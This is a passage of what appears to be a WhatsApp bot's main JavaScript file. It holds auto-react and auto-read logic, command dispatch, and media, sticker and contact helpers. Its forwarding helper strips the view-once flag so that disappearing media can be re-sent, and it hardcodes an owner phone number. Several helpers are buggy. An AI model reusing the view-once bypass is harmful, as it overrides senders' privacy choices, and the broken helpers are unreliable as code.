'🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', "🇺🇸", "🇬🇧", "🇨🇦", "🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", '👍', '👎', '👏', '👫', '👭', '👬', '👮', '🤝', '🙏', '👑', '🌻', '🌺', '🌸', '🌹', '🌴', "🏞️", '🌊', '🚗', '🚌', "🛣️", "🛫️", "🛬️", '🚣', '🛥', '🚂', '🚁', '🚀', "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", '🎾', '🏀', '🏈', '🎯', '🏆', '??', '⬆️', '⬇️', '⇒', '⇐', '↩️', '↪️', 'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];

        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}
  // Custom React for all messages (public and owner)
if (!isReact && config.CUSTOM_REACT === 'true') {
    // Use custom emojis from the configuration (fallback to default if not set)
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
//AUto Read Function 
conn.ev.on('messages.upsert', async (mek) => {
    try {
        mek = mek.messages[0];
        if (!mek.message) return;

        // Handle ephemeral messages
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
            ? mek.message.ephemeralMessage.message 
            : mek.message;

        // Auto-read functionality
        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);  // Mark message as read
            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }

        // Continue with your existing message processing logic here...
        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe 
            ? conn.user.id.split(':')[0] + '@s.whatsapp.net' 
            : mek.key.participant || mek.key.remoteJid;

        // More code...
    } catch (err) {
        console.error('Error in message handler:', err);
    }
});    
//__________________OWNER REACT_______________________________________________________________________
                if(senderNumber.includes("94727319036")){
                    if(isReact) return
                    m.react("💃🏻")
                  }
//_________Ofline___________________
if (config.ALWAYS_ONLINE === "false") {
        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
}
//_________________________WORK TYPE____________________________________________________________________
    if(!isOwner && config.MODE === "private") return
    if(!isOwner && isGroup && config.MODE === "inbox") return
    if(!isOwner && !isGroup && config.MODE === "groups") return
 
    
    const events = require('./rashu/lib/command')
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
    if (cmd) {
    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
    
    try {
    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
    } catch (e) {
    console.error("[PLUGIN ERROR] " + e);
    }
    }
    }
    events.commands.map(async(command) => {
      if (body && command.on === "body") {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      } else if (mek.q && command.on === "text") {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      } else if (
      (command.on === "image" || command.on === "photo") &&
      mek.type === "imageMessage"
      ) {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      } else if (
      command.on === "sticker" &&
      mek.type === "stickerMessage"
      ) {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
      }});
      
      });
        //===================================================   
        conn.decodeJid = jid => {
          if (!jid) return jid;
          if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
              (decode.user &&
                decode.server &&
                decode.user + '@' + decode.server) ||
              jid
            );
          } else return jid;
        };
        //===================================================
        conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
          let vtype
          if (options.readViewOnce) {
              message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
              vtype = Object.keys(message.message.viewOnceMessage.message)[0]
              delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
              delete message.message.viewOnceMessage.message[vtype].viewOnce
              message.message = {
                  ...message.message.viewOnceMessage.message
              }
          }
        
          let mtype = Object.keys(message.message)[0]
          let content = await generateForwardMessageContent(message, forceForward)
          let ctype = Object.keys(content)[0]
          let context = {}
          if (mtype != "conversation") context = message.message[mtype].contextInfo
          content[ctype].contextInfo = {
              ...context,
              ...content[ctype].contextInfo
          }
          const waMessage = await generateWAMessageFromContent(jid, content, options ? {
              ...content[ctype],
              ...options,
              ...(options.contextInfo ? {
                  contextInfo: {
                      ...content[ctype].contextInfo,
                      ...options.contextInfo
                  }
              } : {})
          } : {})
          await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
          return waMessage
        }
        //=================================================
        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
          let quoted = message.msg ? message.msg : message
          let mime = (message.msg || message).mimetype || ''
          let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
          const stream = await downloadContentFromMessage(quoted, messageType)
          let buffer = Buffer.from([])
          for await (const chunk of stream) {
              buffer = Buffer.concat([buffer, chunk])
          }
          let type = await FileType.fromBuffer(buffer)
          trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
              // save to file
          await fs.writeFileSync(trueFileName, buffer)
          return trueFileName
        }
        //=================================================
        conn.downloadMediaMessage = async(message) => {
          let mime = (message.msg || message).mimetype || ''
          let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
          const stream = await downloadContentFromMessage(message, messageType)
          let buffer = Buffer.from([])
          for await (const chunk of stream) {
              buffer = Buffer.concat([buffer, chunk])
          }
        
          return buffer
        }
        
        /**
        *
        * @param {*} jid
        * @param {*} message
        * @param {*} forceForward
        * @param {*} options
        * @returns
        */
        //================================================
        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                      let mime = '';
                      let res = await axios.head(url)
                      mime = res.headers['content-type']
                      if (mime.split("/")[1] === "gif") {
                        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                      }
                      let type = mime.split("/")[0] + "Message"
                      if (mime === "application/pdf") {
                        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                      }
                      if (mime.split("/")[0] === "image") {
                        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                      }
                      if (mime.split("/")[0] === "video") {
                        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                      }
                      if (mime.split("/")[0] === "audio") {
                        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                      }
                    }
        //==========================================================
        conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
          //let copy = message.toJSON()
          let mtype = Object.keys(copy.message)[0]
          let isEphemeral = mtype === 'ephemeralMessage'
          if (isEphemeral) {
              mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
          }
          let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
          let content = msg[mtype]
          if (typeof content === 'string') msg[mtype] = text || content
          else if (content.caption) content.caption = text || content.caption
          else if (content.text) content.text = text || content.text
          if (typeof content !== 'string') msg[mtype] = {
              ...content,
              ...options
          }
          if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
          else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
          if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
          else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
          copy.key.remoteJid = jid
          copy.key.fromMe = sender === conn.user.id
        
          return proto.WebMessageInfo.fromObject(copy)
        }
        
        
        /**
        *
        * @param {*} path
        * @returns
        */
        //=====================================================
        conn.getFile = async(PATH, save) => {
          let res
          let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
              //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
          let type = await FileType.fromBuffer(data) || {
              mime: 'application/octet-stream',
              ext: '.bin'
          }
          let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
          if (data && save) fs.promises.writeFile(filename, data)
          return {
              res,
              filename,
              size: await getSizeMedia(data),
              ...type,
              data
          }
        
        }
        //=====================================================
        conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
          let types = await conn.getFile(PATH, true)
          let { filename, size, ext, mime, data } = types
          let type = '',
              mimetype = mime,
              pathFile = filename
          if (options.asDocument) type = 'document'
          if (options.asSticker || /webp/.test(mime)) {
              let { writeExif } = require('./exif.js')
              let media = { mimetype: mime, data }
              pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
              await fs.promises.unlink(filename)
              type = 'sticker'
              mimetype = 'image/webp'
          } else if (/image/.test(mime)) type = 'image'
          else if (/video/.test(mime)) type = 'video'
          else if (/audio/.test(mime)) type = 'audio'
          else type = 'document'
          await conn.sendMessage(jid, {
              [type]: { url: pathFile },
              mimetype,
              fileName,
              ...options
          }, { quoted, ...options })
          return fs.promises.unlink(pathFile)
        }
        //=====================================================
        conn.parseMention = async(text) => {
          return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }
        //=====================================================
        conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
          let types = await conn.getFile(path, true)
          let { mime, ext, res, data, filename } = types
          if (res && res.status !== 200 || file.length <= 65536) {
              try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
          }
          let type = '',
              mimetype = mime,
              pathFile = filename
          if (options.asDocument) type = 'document'
          if (options.asSticker || /webp/.test(mime)) {
              let { writeExif } = require('./exif')
              let media = { mimetype: mime, data }
              pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
              await fs.promises.unlink(filename)
              type = 'sticker'
              mimetype = 'image/webp'
          } else if (/image/.test(mime)) type = 'image'
          else if (/video/.test(mime)) type = 'video'
          else if (/audio/.test(mime)) type = 'audio'
          else type = 'document'
          await conn.sendMessage(jid, {
              [type]: { url: pathFile },
              caption,
              mimetype,
              fileName,
              ...options
          }, { quoted, ...options })
          return fs.promises.unlink(pathFile)
        }
        /**
        *
        * @param {*} message
        * @param {*} filename
        * @param {*} attachExtension
        * @returns
        */
        //=====================================================
        conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
          let buffer;
          if (options && (options.packname || options.author)) {
            buffer = await writeExifVid(buff, options);
          } else {
            buffer = await videoToWebp(buff);
          }
          await conn.sendMessage(
            jid,
            { sticker: { url: buffer }, ...options },
            options
          );
        };
        //=====================================================
        conn.sendImageAsSticker = async (jid, buff, options = {}) => {
          let buffer;
          if (options && (options.packname || options.author)) {
            buffer = await writeExifImg(buff, options);
          } else {
            buffer = await imageToWebp(buff);
          }
          await conn.sendMessage(
            jid,
            { sticker: { url: buffer }, ...options },
            options
          );
        };
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
        //=====================================================
        conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
        
                /**
                 *
                 * @param {*} jid
                 * @param {*} path
                 * @param {*} quoted
                 * @param {*} options
                 * @returns
                 */
        //=====================================================
        conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
          let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
          return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
        }
        
        /**
        *
        * @param {*} jid
        * @param {*} path
        * @param {*} caption
        * @param {*} quoted
        * @param {*} options
        * @returns
        */
        //=====================================================
        conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
        
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} caption
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //=====================================================
        conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
          let buttonMessage = {
                  text,
                  footer,
                  buttons,
                  headerType: 2,
                  ...options
              }
              //========================================================================================================================================
          conn.sendMessage(jid, buttonMessage, { quoted, ...options })
        }
        //=====================================================
        conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
          let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
          var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
              templateMessage: {
                  hydratedTemplate: {
                      imageMessage: message.imageMessage,
                      "hydratedContentText": text,
                      "hydratedFooterText": footer,
                      "hydratedButtons": but
                  }
              }
          }), options)
          conn.relayMessage(jid, template.message, { messageId: template.key.id })
        }
        
        /**
        *
        * @param {*} jid
        * @param {*} buttons
        * @param {*} caption
        * @param {*} footer
        * @param {*} quoted
        * @param {*} options
        */
        //=====================================================
        conn.getName = (jid, withoutContact = false) => {
                id = conn.decodeJid(jid);
    
                withoutContact = conn.withoutContact || withoutContact;
    
                let v;
    
                if (id.endsWith('@g.us'))
                    return new Promise(async resolve => {
                        v = store.contacts[id] || {};
    
                        if (!(v.name.notify || v.subject))
                            v = conn.groupMetadata(id) || {};
    
                        resolve(
                            v.name ||
                                v.subject ||
                                PhoneNumber(
                                    '+' + id.replace('@s.whatsapp.net', ''),
                                ).getNumber('international'),
                        );
                    });
                else
                    v =
                        id === '0@s.whatsapp.net'
                            ? {
                                    id,
    
                                    name: 'WhatsApp',
                              }
                            : id === conn.decodeJid(conn.user.id)
                            ? conn.user
                            : store.contacts[id] || {};
    
                return (
                    (withoutContact ? '' : v.name) ||
                    v.subject ||
                    v.verifiedName ||
                    PhoneNumber(
                        '+' + jid.replace('@s.whatsapp.net', ''),
                    ).getNumber('international')
                );
            };
    
            // Vcard Functionality
            conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
                let list = [];
                for (let i of kon) {
                    list.push({
                        displayName: await conn.getName(i + '@s.whatsapp.net'),
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                            i + '@s.whatsapp.net',
                        )}\nFN:${
                            global.OwnerName
                        }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                            global.email
                        }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                            global.github
                        }/awais-md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                            global.location
                        };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                    });
                }
                conn.sendMessage(
                    jid,
                    {
                        contacts: {
                            displayName: `${list.length} Contact`,
                            contacts: list,
                        },
                        ...opts,
                    },
                    { quoted },
                );
            };
    
            // Status aka brio
            conn.setStatus = status => {
                conn.query({
                    tag: 'iq',
                    attrs: {
